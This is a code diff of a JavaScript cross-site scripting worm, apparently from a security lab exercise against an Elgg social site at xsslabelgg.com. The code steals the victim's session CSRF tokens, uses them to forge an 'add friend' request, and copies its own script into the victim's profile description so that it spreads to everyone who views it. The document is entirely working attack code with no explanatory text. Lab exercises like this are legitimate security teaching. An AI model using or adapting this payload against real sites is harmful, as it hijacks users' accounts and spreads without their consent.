@@ -1,3 +1,9 @@
+document.write(
+  "<img src=http://www.xsslabelgg.com/action/friends/add?friend=47"
+    .concat("&__elgg_ts=".concat(elgg.security.token.__elgg_ts))
+    .concat("&__elgg_token=".concat(elgg.security.token.__elgg_token))
+    .concat(" > ")
+);
 window.onload = function() {
   var guid = "&guid=&container_guid".concat(elgg.session.user.guid);
   var ts = "&__elgg_ts=".concat(elgg.security.token.__elgg_ts);
@@ -9,14 +15,7 @@ window.onload = function() {
   var code = document.getElementById("id1").innerHTML;
   var description = "&description=".concat(
     escape(
-      "<img src="
-        .concat(
-          "http://www.xsslabelgg.com/action/friends/add?friend=47"
-            .concat("&__elgg_ts=".concat(elgg.security.token.__elgg_ts))
-            .concat("&__elgg_token=".concat(elgg.security.token.__elgg_token))
-            .concat(" > ")
-        )
-        .concat('<script id="id1" type="text/javascript">')
+      '<script id="id1" type="text/javascript">'
         .concat(code)
         .concat("</".concat("script > "))
     )
